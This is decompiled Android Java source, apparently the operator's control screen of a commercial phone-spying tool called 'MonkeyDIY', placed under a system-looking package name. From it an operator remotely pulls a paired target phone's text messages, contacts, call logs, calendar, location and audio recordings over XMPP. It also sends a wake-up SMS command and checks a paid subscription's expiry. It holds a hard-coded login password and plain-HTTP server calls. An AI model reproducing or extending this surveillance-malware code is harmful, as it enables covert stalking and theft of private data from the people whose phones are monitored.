package com.android.service;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnTouchListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import com.android.service.view.AudioRecordView;
import com.android.service.view.CalendarViewActivity;
import com.android.service.view.CallRecordViewActivity;
import com.android.service.view.ContactsViewActivity;
import com.android.service.view.MapSelectListActivity;
import com.android.service.view.SMSViewActivity;
import com.baidu.mapapi.search.MKSearch;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.HttpClinentModle;
import com.xmpp.client.util.PresenceType;
import com.xmpp.client.util.PushDialogModle;
import com.xmpp.client.util.XmppTool;
import java.io.File;
import java.io.IOException;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.jivesoftware.smack.Chat;
import org.jivesoftware.smack.ChatManager;
import org.jivesoftware.smack.MessageListener;
import org.jivesoftware.smack.XMPPConnection;
import org.jivesoftware.smack.packet.Message;
import org.jivesoftware.smack.packet.Presence;
import org.jivesoftware.smack.packet.Presence.Type;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;
import org.jivesoftware.smackx.packet.IBBExtensions.Open;
import org.jivesoftware.smackx.packet.MessageEvent;
import org.jivesoftware.smackx.workgroup.packet.UserID;
import org.json.JSONException;
import org.json.JSONObject;

public class MainControlActivity extends Activity implements OnClickListener {
    private static final int REQUEST_SELECT_DEVICE = 2;
    public static Chat newChat;
    public static Message sendMsg;
    public static ImageView statusMainImageObj;
    public static ImageView statusPairImageObj;
    /* access modifiers changed from: private */
    public AppPreferences _appPrefs;
    private AlertDialog alert;
    /* access modifiers changed from: private */
    public boolean boolMainStatus = false;
    /* access modifiers changed from: private */
    public Button btn_calendar;
    /* access modifiers changed from: private */
    public Button btn_camera;
    /* access modifiers changed from: private */
    public Button btn_location;
    /* access modifiers changed from: private */
    public Button btn_phonebook;
    /* access modifiers changed from: private */
    public Button btn_photo;
    /* access modifiers changed from: private */
    public Button btn_record;
    private Button btn_refresh;
    /* access modifiers changed from: private */
    public Button btn_sms;
    private Button btn_smshelp;
    private Builder builder;
    /* access modifiers changed from: private */
    public ChatManager chatMana;
    /* access modifiers changed from: private */
    public Handler handlerObj = new Handler() {
        public void handleMessage(android.os.Message msg) {
            switch (msg.what) {
                case 2:
                    try {
                        MainControlActivity.this.mProgressDialog.dismiss();
                    } catch (Exception e) {
                        System.out.print("更新已取消");
                    }
                    Toast.makeText(MainControlActivity.this, "手動更新完成", 1).show();
                    return;
                case 3:
                    new Builder(MainControlActivity.this).setTitle("連結訊息").setMessage("連結結果:成功").setPositiveButton("確定", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            dialog.dismiss();
                        }
                    }).show();
                    return;
                case 4:
                    new Builder(MainControlActivity.this).setTitle("連結訊息").setMessage("連結結果:失敗!!\n請檢查網路是否暢通!!").setPositiveButton("重新配對", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            MainControlActivity.this.startActivity(new Intent(MainControlActivity.this, MainControlActivity.class));
                            MainControlActivity.this.finish();
                        }
                    }).show();
                    return;
                case 5:
                    try {
                        AudioRecordView.RecorderProgressDialog.dismiss();
                    } catch (Exception e2) {
                        System.out.print("更新已取消");
                    }
                    Toast.makeText(MainControlActivity.this, "錄音檔已上傳", 1).show();
                    return;
                case 6:
                    MainControlActivity.this.chatMana = MainControlActivity.this.xmppToolObj.getConnection().getChatManager();
                    MainControlActivity.this.connectToServer();
                    MainControlActivity.this.receiveMFrom(new StringBuilder(String.valueOf(MainControlActivity.this.strSelect_Pairnum)).append("@monkeydiy").toString());
                    return;
                case 7:
                    SMSViewActivity.tv_update_time.setText("更新完成，請點按鈕更新");
                    MainControlActivity.this._appPrefs.saveSMSFlag("0");
                    SMSViewActivity.btn_sms_command.setBackgroundResource(R.drawable.command_img_up);
                    SMSViewActivity.btn_sms_command.setEnabled(true);
                    return;
                case 8:
                    ContactsViewActivity.contact_update_time.setText("更新完成，請點按鈕更新");
                    MainControlActivity.this._appPrefs.saveContactsFlag("0");
                    ContactsViewActivity.btn_contact_command.setBackgroundResource(R.drawable.command_img_up);
                    ContactsViewActivity.btn_contact_command.setEnabled(true);
                    return;
                case 9:
                    CallRecordViewActivity.callrecord_update_time.setText("更新完成，請點按鈕更新");
                    MainControlActivity.this._appPrefs.saveCallrecordFlag("0");
                    CallRecordViewActivity.btn_callrecord_command.setBackgroundResource(R.drawable.command_img_up);
                    CallRecordViewActivity.btn_callrecord_command.setEnabled(true);
                    return;
                case 10:
                    CalendarViewActivity.calendar_update_time.setText("更新完成，請點按鈕更新");
                    MainControlActivity.this._appPrefs.saveCalendarFlag("0");
                    CalendarViewActivity.btn_calendar_command.setBackgroundResource(R.drawable.command_img_up);
                    CalendarViewActivity.btn_calendar_command.setEnabled(true);
                    return;
                case MKSearch.TYPE_POI_LIST /*11*/:
                    MapSelectListActivity.map_update_time.setText("更新完成，請點按鈕更新");
                    MainControlActivity.this._appPrefs.saveMapFlag("0");
                    MapSelectListActivity.btn_map_command.setBackgroundResource(R.drawable.command_img_up);
                    MapSelectListActivity.btn_map_command.setEnabled(true);
                    return;
                default:
                    return;
            }
        }
    };
    private String hostname = "";
    private HttpClinentModle httpClientModleObj;
    /* access modifiers changed from: private */
    public ProgressDialog mProgressDialog;
    private BroadcastReceiver mScreenReceiverObj = null;
    /* access modifiers changed from: private */
    public SharedPreferences mainsp = null;
    private PushDialogModle myDialogModleObj;
    private File myFileDir;
    private File path;
    String result = "";
    private SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy/MM/dd kk:mm");
    /* access modifiers changed from: private */
    public String strSelect_Mainnum;
    /* access modifiers changed from: private */
    public String strSelect_Pairnum = "";
    /* access modifiers changed from: private */
    public TextView tv_connect_time;
    /* access modifiers changed from: private */
    public XmppTool xmppToolObj;

    class CheckStatusAndConnectAsync extends AsyncTask<Integer, Integer, String> {
        CheckStatusAndConnectAsync() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            MainControlActivity.this.mProgressDialog = new ProgressDialog(MainControlActivity.this);
            MainControlActivity.this.mProgressDialog.setMessage("狀態讀取中...請稍候");
            MainControlActivity.this.mProgressDialog.setProgressStyle(0);
            MainControlActivity.this.mProgressDialog.setCancelable(false);
            MainControlActivity.this.mProgressDialog.getWindow().setType(2003);
            MainControlActivity.this.mProgressDialog.show();
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(Integer... aurl) {
            try {
                Thread.sleep(2000);
                MainControlActivity.this.Connection();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String unused) {
            if (MainControlActivity.this.result.equalsIgnoreCase("true")) {
                try {
                    MainControlActivity.this.mProgressDialog.dismiss();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                    MainControlActivity.this.mProgressDialog.dismiss();
                    return;
                }
            }
            MainControlActivity.this.mProgressDialog.dismiss();
        }
    }

    public class ScreenReceiver extends BroadcastReceiver {
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals("android.intent.action.USER_PRESENT")) {
                System.out.println("=========ACTION_USER_PRESENT==========");
                if (MainControlActivity.this.strSelect_Pairnum != null && MainControlActivity.this.strSelect_Pairnum.length() > 0) {
                    if (MainControlActivity.this.getStatusAndSetPairImage(MainControlActivity.this.strSelect_Pairnum).booleanValue()) {
                        String updata_time = MainControlActivity.this.getAndUpdateJasonTime();
                        if (!(updata_time == null || MainControlActivity.this.tv_connect_time == null)) {
                            MainControlActivity.this.tv_connect_time.setText(updata_time);
                        }
                    }
                    MainControlActivity.this.boolMainStatus = MainControlActivity.this.getstatus(MainControlActivity.this.strSelect_Mainnum).booleanValue();
                    if (MainControlActivity.this.boolMainStatus) {
                        MainControlActivity.statusMainImageObj.setImageResource(R.drawable.online);
                        return;
                    }
                    Log.e(MessageEvent.OFFLINE, MessageEvent.OFFLINE);
                    MainControlActivity.statusMainImageObj.setImageResource(R.drawable.offline);
                }
            }
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        setContentView(R.layout.main);
        this._appPrefs = new AppPreferences(this);
        this.xmppToolObj = new XmppTool(this);
        this.hostname = getString(R.string.hostname);
        this.httpClientModleObj = new HttpClinentModle(this);
        this.myDialogModleObj = new PushDialogModle(this);
        if (this._appPrefs.getUserid() == null || this._appPrefs.getUserid().length() <= 0) {
            new Builder(this).setTitle("訊息通知").setMessage("尚未取用帳戶,請確認是否安裝正確!!").setPositiveButton("確定", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    System.exit(0);
                }
            }).show();
        } else {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
            try {
                if (sdf.parse(sdf.format(new Date())).before(sdf.parse(GetExpirationDate(this._appPrefs.getUserid())))) {
                    enterMainControl();
                } else {
                    new Builder(this).setTitle("訊息通知").setMessage("帳號使用期限已到期,請聯絡管理人員!!").setPositiveButton("確定", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            System.exit(0);
                        }
                    }).show();
                }
            } catch (ParseException e) {
                e.printStackTrace();
            } catch (org.apache.http.ParseException e2) {
                e2.printStackTrace();
            }
        }
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.USER_PRESENT");
        this.mScreenReceiverObj = new ScreenReceiver();
        registerReceiver(this.mScreenReceiverObj, filter);
    }

    private void enterMainControl() {
        init();
        this.strSelect_Mainnum = this._appPrefs.getMainnum();
        this.strSelect_Pairnum = this._appPrefs.getPairnum();
        this.mainsp = getSharedPreferences("MAINSET", 0);
        try {
            new CheckStatusAndConnectAsync().execute(new Integer[0]).get(120000, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            this.myDialogModleObj.PushAlertSingleButton("系統出錯", this.strSelect_Pairnum + ":" + Log.getStackTraceString(e));
        } catch (ExecutionException e2) {
            this.myDialogModleObj.PushAlertSingleButton("系統出錯", this.strSelect_Pairnum + ":" + Log.getStackTraceString(e2));
        } catch (TimeoutException e3) {
            this.mProgressDialog.dismiss();
            this.myDialogModleObj.PushAlertSingleButton("更新訊息", "超過更新時間，請重新更新!!");
        } catch (Exception e4) {
            this.myDialogModleObj.PushAlertSingleButton("系統出錯", this.strSelect_Pairnum + ":" + Log.getStackTraceString(e4));
        }
    }

    private String GetExpirationDate(String strId) {
        String TAG_success = "success";
        String TAG_errmsg = "errmsg";
        try {
            JSONObject json = new JSONObject(EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet("http://" + this.hostname + ":8080/MonkeyDIYWeb/user_querytime?id=" + strId)).getEntity()));
            if (json.getString("success").equalsIgnoreCase("true")) {
                String[] ExpirationDateSplit = json.getString(AppPreferences.KEY_PREFS_EXPDATE).split(" ");
                Log.e(AppPreferences.KEY_PREFS_EXPDATE, ExpirationDateSplit[0]);
                String ExpirationDate = ExpirationDateSplit[0];
                this._appPrefs.saveExpirationDate(ExpirationDateSplit[0]);
                return ExpirationDate;
            }
            Toast.makeText(getApplicationContext(), "失敗!! 請重新輸入!!", 1).show();
            return null;
        } catch (JSONException e) {
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), "失敗!! 請重新輸入!!", 1).show();
            return null;
        } catch (IOException e2) {
            e2.printStackTrace();
            Toast.makeText(getApplicationContext(), "失敗!! 請重新輸入!!", 1).show();
            return null;
        } catch (Exception e3) {
            e3.printStackTrace();
            return null;
        }
    }

    /* access modifiers changed from: private */
    public Boolean getStatusAndSetPairImage(String strTarget) {
        if (getstatus(strTarget).booleanValue()) {
            statusPairImageObj.setImageResource(R.drawable.online);
            return Boolean.valueOf(true);
        }
        Log.e(MessageEvent.OFFLINE, MessageEvent.OFFLINE);
        statusPairImageObj.setImageResource(R.drawable.offline);
        return Boolean.valueOf(false);
    }

    /* access modifiers changed from: private */
    public void Connection() {
        Log.e(UserID.ELEMENT_NAME, this.strSelect_Mainnum);
        if (getStatusAndSetPairImage(this.strSelect_Pairnum).booleanValue()) {
            String updata_time = getAndUpdateJasonTime();
            if (!(updata_time == null || this.tv_connect_time == null)) {
                this.tv_connect_time.setText(updata_time);
            }
        }
        this.boolMainStatus = getstatus(this.strSelect_Mainnum).booleanValue();
        if (haveInternet() && !this.boolMainStatus) {
            this.chatMana = this.xmppToolObj.getConnection().getChatManager();
            connectToServer();
            receiveMFrom(this.strSelect_Pairnum + "@monkeydiy");
            statusMainImageObj.setImageResource(R.drawable.online);
        }
        this.result = "true";
    }

    public String getAndUpdateJasonTime() {
        String urlAPI = "http://" + this.hostname + "/API/getConnectTime.ashx?phonenum=" + this.strSelect_Pairnum;
        System.out.println("----------<<urlAPI>>----------" + urlAPI);
        String strJason = this.httpClientModleObj.HttpClinentJason(urlAPI);
        try {
            JSONObject json = new JSONObject(strJason);
            if (json.getString("success").equalsIgnoreCase("true")) {
                return json.getString(Data.ELEMENT_NAME);
            }
            this.myDialogModleObj.PushAlertSingleButton("伺服器訊息", json.getString("reason"));
            return null;
        } catch (JSONException e) {
            this.myDialogModleObj.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e)).toString());
            return null;
        } catch (Exception e2) {
            this.myDialogModleObj.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e2)).toString());
            return null;
        }
    }

    /* access modifiers changed from: private */
    public void receiveMFrom(String from) {
        newChat = this.chatMana.createChat(from, null);
        newChat.addMessageListener(new MessageListener() {
            public void processMessage(Chat arg0, Message arg1) {
                if (arg1.getTo().contains(MainControlActivity.this.strSelect_Mainnum)) {
                    Log.e("from --->to..", arg1.getFrom() + "--sender");
                    android.os.Message msgs = new android.os.Message();
                    Log.e("from .", arg1.getBody() + "to message");
                    if (arg1.getBody().equalsIgnoreCase("handupload")) {
                        msgs.what = 2;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("recordupload")) {
                        msgs.what = 5;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("sms_update_end")) {
                        msgs.what = 7;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("contact_update_end")) {
                        msgs.what = 8;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("callrecord_update_end")) {
                        msgs.what = 9;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("calendar_update_end")) {
                        msgs.what = 10;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("map_update_end")) {
                        msgs.what = 11;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    }
                }
            }
        });
    }

    /* access modifiers changed from: private */
    public void connectToServer() {
        new Thread(new Runnable() {
            public void run() {
                android.os.Message msgs;
                try {
                    Log.e("--------------->", "logining...");
                    XMPPConnection xc = MainControlActivity.this.xmppToolObj.getConnection();
                    if (!xc.isAuthenticated()) {
                        xc.login(MainControlActivity.this.strSelect_Mainnum, "1234");
                    }
                    xc.sendPacket(new Presence(Type.available));
                    msgs = new android.os.Message();
                    if (MainControlActivity.this.mainsp.getString("mainset", "") == null || MainControlActivity.this.mainsp.getString("mainset", "").length() == 0) {
                        msgs.what = 3;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                        MainControlActivity.this.mainsp.edit().putString("mainset", Open.ELEMENT_NAME).commit();
                    }
                    Thread.sleep(2000);
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.e("--------------->", "login failed...");
                    MainControlActivity.this.xmppToolObj.closeConnection();
                    msgs = new android.os.Message();
                    if (MainControlActivity.this.mainsp.getString("mainset", "") == null || MainControlActivity.this.mainsp.getString("mainset", "").length() == 0) {
                        msgs.what = 4;
                        MainControlActivity.this.handlerObj.sendMessage(msgs);
                    }
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn_refresh /*2131099689*/:
                if (getStatusAndSetPairImage(this.strSelect_Pairnum).booleanValue()) {
                    String updata_time = getAndUpdateJasonTime();
                    if (!(updata_time == null || this.tv_connect_time == null)) {
                        this.tv_connect_time.setText(updata_time);
                    }
                }
                this.boolMainStatus = getstatus(this.strSelect_Mainnum).booleanValue();
                if (this.boolMainStatus) {
                    statusMainImageObj.setImageResource(R.drawable.online);
                    return;
                }
                Log.e(MessageEvent.OFFLINE, MessageEvent.OFFLINE);
                statusMainImageObj.setImageResource(R.drawable.offline);
                return;
            case R.id.btn_smshelp /*2131099690*/:
                Send_SMS();
                return;
            case R.id.btn_sms /*2131099696*/:
                Intent intent = new Intent();
                intent.setClass(this, SMSViewActivity.class);
                startActivity(intent);
                return;
            case R.id.btn_location /*2131099697*/:
                startActivityForResult(new Intent(this, MapSelectListActivity.class), 2);
                return;
            case R.id.btn_phonebook /*2131099699*/:
                Intent intent1 = new Intent();
                intent1.setClass(this, ContactsViewActivity.class);
                startActivity(intent1);
                return;
            case R.id.btn_record /*2131099700*/:
                Intent intent2 = new Intent();
                intent2.setClass(this, CallRecordViewActivity.class);
                startActivity(intent2);
                return;
            case R.id.btn_camera /*2131099702*/:
                startActivity(new Intent(this, AudioRecordView.class));
                return;
            case R.id.btn_calendar /*2131099703*/:
                startActivity(new Intent(this, CalendarViewActivity.class));
                return;
            default:
                return;
        }
    }

    private void Send_SMS() {
        final View v = LayoutInflater.from(this).inflate(R.layout.alertdialog_edittext, null);
        new Builder(this).setTitle("請輸入子機的手機號碼,嘗試喚醒\n(送出後請於2分鐘後再嘗試刷新狀態)").setView(v).setPositiveButton("確定", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                String strSMSControl = MainControlActivity.this.getString(R.string.SMSControl);
                EditText editText = (EditText) v.findViewById(R.id.edittext);
                if (strSMSControl != null && editText != null) {
                    SmsManager smsManager = SmsManager.getDefault();
                    String strNum = editText.getText().toString();
                    if (strNum != null && strNum.length() > 0) {
                        smsManager.sendTextMessage(editText.getText().toString(), null, strSMSControl, null, null);
                    }
                }
            }
        }).setNegativeButton("取消", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        }).show();
    }

    private void init() {
        this.tv_connect_time = (TextView) findViewById(R.id.tv_connect_time);
        statusPairImageObj = (ImageView) findViewById(R.id.img_pair_status);
        statusMainImageObj = (ImageView) findViewById(R.id.img_main_status);
        this.btn_refresh = (Button) findViewById(R.id.btn_refresh);
        this.btn_smshelp = (Button) findViewById(R.id.btn_smshelp);
        this.btn_sms = (Button) findViewById(R.id.btn_sms);
        this.btn_location = (Button) findViewById(R.id.btn_location);
        this.btn_phonebook = (Button) findViewById(R.id.btn_phonebook);
        this.btn_record = (Button) findViewById(R.id.btn_record);
        this.btn_camera = (Button) findViewById(R.id.btn_camera);
        this.btn_calendar = (Button) findViewById(R.id.btn_calendar);
        this.btn_photo = (Button) findViewById(R.id.btn_photo);
        this.btn_sms.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_sms.setBackgroundResource(R.drawable.photo_sms_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_sms.setBackgroundResource(R.drawable.photo_sms_down);
                }
                return false;
            }
        });
        this.btn_location.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_location.setBackgroundResource(R.drawable.photo_gps_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_location.setBackgroundResource(R.drawable.photo_gps_down);
                }
                return false;
            }
        });
        this.btn_phonebook.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_phonebook.setBackgroundResource(R.drawable.photo_phonebook_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_phonebook.setBackgroundResource(R.drawable.photo_phonebook_down);
                }
                return false;
            }
        });
        this.btn_record.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_record.setBackgroundResource(R.drawable.photo_contacts_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_record.setBackgroundResource(R.drawable.photo_contacts_down);
                }
                return false;
            }
        });
        this.btn_camera.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_camera.setBackgroundResource(R.drawable.photo_recording_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_camera.setBackgroundResource(R.drawable.photo_recording_down);
                }
                return false;
            }
        });
        this.btn_calendar.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_calendar.setBackgroundResource(R.drawable.photo_calendar_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_calendar.setBackgroundResource(R.drawable.photo_calendar_down);
                }
                return false;
            }
        });
        this.btn_photo.setOnTouchListener(new OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == 1) {
                    MainControlActivity.this.btn_photo.setBackgroundResource(R.drawable.photo_photo_up);
                }
                if (event.getAction() == 0) {
                    MainControlActivity.this.btn_photo.setBackgroundResource(R.drawable.photo_photo_down);
                }
                return false;
            }
        });
        this.btn_refresh.setOnClickListener(this);
        this.btn_smshelp.setOnClickListener(this);
        this.btn_sms.setOnClickListener(this);
        this.btn_location.setOnClickListener(this);
        this.btn_phonebook.setOnClickListener(this);
        this.btn_record.setOnClickListener(this);
        this.btn_camera.setOnClickListener(this);
        this.btn_calendar.setOnClickListener(this);
        this.btn_photo.setOnClickListener(this);
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        if (this.xmppToolObj != null) {
            this.xmppToolObj.closeConnection();
        }
        if (this.mScreenReceiverObj != null) {
            unregisterReceiver(this.mScreenReceiverObj);
        }
        super.onDestroy();
    }

    private boolean haveInternet() {
        NetworkInfo info = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        if (info == null) {
            return false;
        }
        if (info.isConnected()) {
            return true;
        }
        return false;
    }

    /* access modifiers changed from: private */
    public Boolean getstatus(String strRole) {
        if (new PresenceType(this).GetPresenceType(strRole).booleanValue()) {
            return Boolean.valueOf(true);
        }
        return Boolean.valueOf(false);
    }
}
